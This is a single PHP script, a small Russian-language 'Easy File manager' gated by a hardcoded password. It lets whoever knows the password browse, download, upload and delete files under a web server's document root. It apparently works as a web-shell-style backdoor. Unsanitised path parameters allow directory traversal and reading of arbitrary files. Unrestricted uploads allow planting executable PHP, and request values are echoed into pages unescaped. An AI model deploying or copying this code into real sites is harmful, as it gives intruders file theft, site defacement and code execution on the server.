<?php 
@session_start();
$pass='wx9';
if (!$_SESSION['pwd'] || ($_SESSION['pwd'] && $_SESSION['pwd']!=$pass)) {

  if ($_REQUEST['pwd']==$pass) {
      $_SESSION['pwd']=$_REQUEST['pwd'];
  } else {
      ?>
  <form method="POST">
  spec.password:<input type="password" name="pwd"><input type="submit" value="»">
  </form>
  <?
  die;
  }
}

define(ROOT,$_SERVER['DOCUMENT_ROOT'].'/');
class filemanager{
    function auto_run(){
        
        $this->mod_url=parse_url($_SERVER['REQUEST_URI']);
        $this->mod_url=$this->mod_url['path'];
        
        switch ($_REQUEST['i']) {
            case 'create_folder':
                    return $this->create_folder();
                break;

            case 'show':
                    return $this->show();
                break;
            case 'download':
                    $this->download();die;
                break;
            case 'delete':
                    return $this->delete();
                break;
            case 'upload':
                    return $this->upload();
                break;
            default:
                    return $this->show();
            break;
        }
    }
    
    function show($msg=''){
        $this->path=$this->cutSlashEnd($_REQUEST['path']);
        $list_files=scandir($this->path ? ROOT.$this->path.'/' : ROOT);
        $title='<h1>Файловый менеджер</h1> <span style="color:'.$msg[1].';">'.$msg[0].'</span>';
        return $title.$this->upload_form($this->path).$this->list_files($this->path,$list_files);
    }
    
    function cutSlashEnd($str) {
        return preg_replace('/\/$/', "", $str);
    }
    
    function cutSlashBegin($str) {
        return preg_replace('/^\//', "", $str); 
    }
    
    function download(){
        $this->path = $this->cutSlashBegin($this->cutSlashEnd($_REQUEST['path']));

        $filename = $this->path;
        
        // required for IE, otherwise Content-disposition is ignored
        if(ini_get('zlib.output_compression'))
          ini_set('zlib.output_compression', 'Off');
        
        // addition by Jorg Weske
        $file_extension = strtolower(substr(strrchr($filename,"."),1));
        
        if( $filename == "" ) {
          exit;
        } elseif ( ! file_exists( $filename ) ) {
          echo "<html><title>Error</title><body>ERROR: File not found. USE force-download.php?file=filepath</body></html>";
          exit;
        };
        switch( $file_extension )
        {
          case "pdf": $ctype="application/pdf"; break;
          case "exe": $ctype="application/octet-stream"; break;
          case "zip": $ctype="application/zip"; break;
          case "doc": $ctype="application/msword"; break;
          case "xls": $ctype="application/vnd.ms-excel"; break;
          case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
          case "gif": $ctype="image/gif"; break;
          case "png": $ctype="image/png"; break;
          case "jpeg":
          case "jpg": $ctype="image/jpg"; break;
          default: $ctype="application/force-download";
        }
        header("Pragma: public"); // required
        header("Expires: 0");
        header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
        header("Cache-Control: private",false); // required for certain browsers 
        header("Content-Type: $ctype");
        // change, added quotes to allow spaces in filenames, by Rajkumar Singh
        header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
        header("Content-Transfer-Encoding: binary");
        header("Content-Length: ".filesize($filename));
        readfile("$filename");
        exit();
    }
    
    function create_folder(){
      if (trim($_REQUEST['folder']) != '') {
        $this->path=str_replace('\\','/',$this->cutSlashBegin($this->cutSlashEnd($_REQUEST['path'])));

        $folder=ROOT.$this->path.'/'.basename($_REQUEST['folder']);
        @mkdir($folder , 0755);
        return $this->show(array('Папка создана','#22bb00'));
      };
       return $this->show();
    }


    function upload(){
        $this->path=str_replace('\\','/',$this->cutSlashBegin($this->cutSlashEnd($_REQUEST['path'])));
        copy($_FILES['file']['tmp_name'], ROOT.$this->path.'/'.basename($_FILES['file']['name']));
        return $this->show(array('Файл загружен','#22bb00'));
    }
    
    function delete(){
        $this->path=ROOT.str_replace('\\','/',$this->cutSlashBegin($this->cutSlashEnd($_REQUEST['path'])));
        foreach ($_REQUEST['del'] as $key => $obj) {
            if (is_file($this->path.'/'.$obj)) {
                unlink($this->path.'/'.$obj);
            } else {
                $this->removeDirectory($this->path.'/'.$obj);
            }
        }
        return $this->show(array('Отмеченные файлы удалены','#22bb00'));
    }
    
    function removeDirectory($dir) {
        if ($objs = glob($dir."/*")) {
           foreach($objs as $obj) {
             is_dir($obj) ? $this->removeDirectory($obj) : unlink($obj);
           }
        }
        rmdir($dir);
    }
    
    function list_files($path,$list){
        $folder_ico="data:image/gif;base64,R0lGODlhFgAWANU0AMWSLf/3kf/Ub//ge//rhd/f3//0jsyZNLOBG/b29v/MZ8uYM4ODg8jIyJpoAseUL25ubsmWMZxqBLB+GJ5sBoyMjP/mgcCNKKNxC8KPKrWCHb2KJbiFILqHIq58FplnAaBuCNypRKh2EN7e3vjFYNOgO0xMTO+8V+azTqVzDff396t5E7SBHLyJJLeEH7+MJ9bW1m1tbf//////mf///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADQALAAAAAAWABYAAAaxQJpwSCwaj8ikcslsCg+LyKOQcNIOsqws06gysbPwTLbpuDSISUF1XAQMcLg266mMjhGCBcDvX1ocLAgIBUYPAwBzihYyGBVGAAIHYpRhJDMgEEYZCgszAaChoCczFDFGFwoAMwStrq0oMxKnRRsKLzMDuru6ITMOtEQdChwzAsfIxyUzH5pFBWgTHisiKRggFBIOHyYMRgkNDDHj5OUxDA1HCQUw7e7vMIVW8/T19kZBADs=";
        $file_ico="data:image/gif;base64,R0lGODlhFgAWAMQQAP///4aGhlVVVefn1ggICAAAmczMzJmZmYAAAAAA/wCAAMvLy//MMwD/////AP8AAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABAALAAAAAAWABYAAAV1ICSOZGmeaKquZOC+8LEGQ23bh6AGQO/7B4AOxfv9coKhiQdrEhbKErPAKFivBCERELh6C9loi2vsDcJbngPRSwDO2hMTgHgAEo0EXDya03sKCntpNzdocgAEiouMcUtlZXwiAQaVlpeVkhBJnJ2eLKChoqMhADs=";

        $html='<form action="'.$this->mod_url.'" method="POST"><ul>';
        $not_allowed=array();
        foreach ($list as $key => $item) {
            if ($item=='.') continue;
            $back_path=explode('/',$path);
            unset($back_path[count($back_path)-1]);
            $back_path=implode('/',$back_path);
            $href=ROOT.$path.'/'.$item;
            $ext=explode('.',$item);
            $link=(is_file($href) && !in_array($ext[count($ext)-1], $not_allowed)) ? $path.'/'.$item : '';
            
            $href=$this->mod_url.'?f='.(is_file($href) ? '&i=download' : '').'&path='.($item=='..' ? $back_path : $path.'/'.$item);
            if (is_file(ROOT.$path.'/'.$item)) {
              $ico = $file_ico;
              if (preg_match('/.*\.(jpeg|jpg|bmp|gif|png)/', $item)) {
                $ico = $path.'/'.$item;
              }
            } else {
              $ico = $folder_ico;
            }
            if ($item != '..') {
              $html.= "<input type='checkbox' name='del[]' value='".$item."'>";
            }  
            $html.= '<img src="'.$ico.'" style="distplay: inline; max-width: 30px; height: 20px;">';
            $html.= '<a href="'.$href.'">'.$item.'</a><br/>';
        }
        $html.='</ul><br/>
            <input type="submit" value="Удалить отмеченые" onclick="return confirm(\'Отмеченные файлы будут безвозвратно удалены! Вы уверены?\');">
            <input type="hidden" name="i" value="delete">
            <input type="hidden" name="path" value="'.$_REQUEST['path'].'"></form>';
        return $html;
    }
    
    function upload_form($path){
        return '
        <form action="" method="POST" style="display:block;" enctype="multipart/form-data">
            Путь:
            <input type="text" readonly="readonly" name="path" value="'.$path.'">
            <input type="file" name="file">
            <input type="hidden" name="i" value="upload">
            <input type="submit" value="Загрузить">
        </form>
        <br />
        <form action="" method="POST" style="display:block;">
            Создать папку:
            <input type="hidden" readonly="readonly" name="path" value="'.$path.'">
            <input type="text" name="folder">
            <input type="hidden" name="i" value="create_folder">
            <input type="submit" value="Создать папку">
        </form>';
    }
}

$fm=new filemanager();
$result = $fm->auto_run();
?><!DOCTYPE html>
<html>
	<head>
		<title>Easy File manager</title>
		<meta http-equiv="content-type" content="text/html; charset=utf-8">
	</head>		
		<body>
    <?php echo $result; ?>
	</body>
</html>